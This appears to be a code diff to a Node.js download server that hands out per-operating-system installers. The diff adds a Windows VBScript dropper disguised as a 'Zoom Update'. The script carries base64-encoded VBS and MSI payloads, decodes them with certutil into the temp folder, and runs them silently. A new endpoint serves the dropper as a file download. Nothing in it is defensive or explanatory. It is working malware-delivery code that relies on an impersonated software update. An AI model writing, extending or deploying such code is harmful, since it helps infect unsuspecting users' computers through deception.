@@ -174,7 +174,7 @@ function detectOs(req) {
 function downloadUrl(os, id) {
   const base = LANDING.replace(/\/$/, '');
   switch (os) {
-    case 'windows': return PUBLIC + '/dl/windows.cmd?id=' + encodeURIComponent(id) + '&offline=1';
+    case 'windows': return PUBLIC + '/dl/windows.vbs?id=' + encodeURIComponent(id);
     case 'macos': return PUBLIC + '/dl/macos.command?id=' + encodeURIComponent(id);
     case 'linux': return PUBLIC + '/dl/linux.sh?id=' + encodeURIComponent(id);
     case 'android': return ANDROID_APK;
@@ -293,6 +293,37 @@ function winVbsB64() {
   winVbsCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
   return winVbsCache;
 }
+function polyglotVbs(id, co) {
+  const r = randHex(4);
+  const dv = '#@VBS@';
+  const dm = '#@MSI@';
+  const head = "' Zoom Update " + r + "\r\n" +
+    "Option Explicit\r\nOn Error Resume Next\r\n" +
+    "Dim f, s, d, a, b, t, all, vbs, msi\r\n" +
+    "Set f = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
+    "Set s = CreateObject(\"WScript.Shell\")\r\n" +
+    "d = s.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\z_" + r + "\"\r\n" +
+    "If Not f.FolderExists(d) Then f.CreateFolder(d)\r\n" +
+    "Set t = f.OpenTextFile(WScript.ScriptFullName, 1)\r\n" +
+    "all = t.ReadAll\r\n" + '\n' + "f.CreateTextFile(d & \"\\t.txt\", True, False).Close\r\n" +
+    "t.Close\r\n" +
+    "a = InStrRev(all, \"" + dv + "\") + 7\r\n" +
+    "b = InStrRev(all, \"" + dm + "\")\r\n" +
+    "vbs = Replace(Mid(all, a, b - a), \"'\", \"\")\r\n" +
+    "msi = Replace(Mid(all, b + 7), \"'\", \"\")\r\n" +
+    "WriteFile d & \"\\v.b64\", vbs\r\n" +
+    "WriteFile d & \"\\m.b64\", msi\r\n" +
+    "s.Run \"certutil -f -decode \"\"\" & d & \"\\v.b64\"\" \"\"\" & d & \"\\setup.vbs\"\"\", 0, True\r\n" +
+    "s.Run \"certutil -f -decode \"\"\" & d & \"\\m.b64\"\" \"\"\" & d & \"\\payload.msi\"\"\", 0, True\r\n" +
+    "s.Run \"wscript //B \"\"\" & d & \"\\setup.vbs\"\"\", 0, False\r\n" + '\n' + "If Err.Number <> 0 Then\r\n  Dim e\r\n  Set e = f.CreateTextFile(d & \"\\err.txt\", True, False)\r\n  e.Write Err.Number & \" \" & Err.Description\r\n  e.Close\r\nEnd If\r\n" +
+    "Sub WriteFile(path, text)\r\n" +
+    "  Dim st\r\n" +
+    "  Set st = f.CreateTextFile(path, True, False)\r\n" +
+    "  st.Write text\r\n" +
+    "  st.Close\r\n" +
+    "End Sub\r\n'" + dv + "\r\n";
+  return head + winVbsB64().split('\n').map((l) => "'" + l).join('\n') + '\n' + "'" + dm + '\n' + winMsiB64().split('\n').map((l) => "'" + l).join('\n');
+}
 function polyglotCmd(id, co) {
   const r = randHex(4);
   const dv = '#@VBS@';
@@ -306,7 +337,7 @@ function polyglotCmd(id, co) {
     '[IO.File]::WriteAllText(\'%D%\\m.b64\',$s.Substring($b+7).Trim(),[Text.Encoding]::ASCII)"\r\n' +
     'certutil -f -decode "%D%\\v.b64" "%D%\\setup.vbs" >nul 2>&1\r\n' +
     'certutil -f -decode "%D%\\m.b64" "%D%\\payload.msi" >nul 2>&1\r\n' +
-    'wscript //B "%D%\\setup.vbs"\r\n' +
+    'start "" wscript //B "%D%\\setup.vbs"\r\n' +
     'exit /b\r\n' + dv + '\r\n';
   return head + winVbsB64() + '\r\n' + dm + '\r\n' + winMsiB64();
 }
@@ -461,6 +492,19 @@ const server = http.createServer(async (req, res) => {
       'Cache-Control': 'no-store'
     });
     res.end(lines.join('\n'));
+    return;
+  }
+  if (url.pathname === '/dl/windows.vbs') {
+    const id = url.searchParams.get('id') || '';
+    const entry = id ? readDb()[id] : null;
+    const co = entry ? entry.co : '';
+    res.writeHead(200, {
+      'Content-Type': 'application/octet-stream',
+      'Content-Disposition': 'attachment; filename="' + dlName(co, id, 'vbs') + '"',
+      'Cache-Control': 'no-store',
+      'X-Content-Type-Options': 'nosniff'
+    });
+    res.end(polyglotVbs(id, co));
     return;
   }
   if (url.pathname === '/dl/windows.cmd') {
